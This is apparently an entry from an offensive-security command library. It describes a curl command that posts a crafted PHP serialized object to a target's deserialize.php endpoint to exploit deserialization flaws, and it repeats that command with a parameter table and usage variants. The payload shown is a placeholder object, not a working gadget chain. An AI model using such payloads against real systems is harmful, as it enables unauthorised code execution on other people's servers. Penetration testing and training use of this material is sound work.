---
data: >-
  curl -X POST "http://target.com/deserialize.php" -d
  'payload=O:8:"Example":1:{s:3:"var";s:3:"foo";}'
tags:
  - deserialization
  - php
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a8b900f0-1e76-4a95-ab74-5d2b3a1c9e31
created_at: '2025-12-13T09:00:27.439Z'
updated_at: '2025-12-13T09:00:27.439Z'
verified: false
validated: true
submitted: true
---
# PHP Deserialization Payload

## Command

```bash
curl -X POST "http://target.com/deserialize.php" -d 'payload=O:8:"Example":1:{s:3:"var";s:3:"foo";}'
```

## Description

This command sends a crafted PHP serialized payload to exploit deserialization vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-d 'payload=...'` | Serialized data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://target.com/deserialize.php" -d 'payload=O:8:"Example":1:{s:3:"var";s:3:"foo";}'
```

### Advanced Usage

```bash
curl -X POST "http://target.com/deserialize.php" -d 'payload=your-custom-serialized-object'
```

## Expected Output

Response indicating successful deserialization, potentially with executed code output.

## Related

- [[procedures/Exploit-PHP-Deserialization-Vulnerability]]
- [[tools/Burp-Suite]]
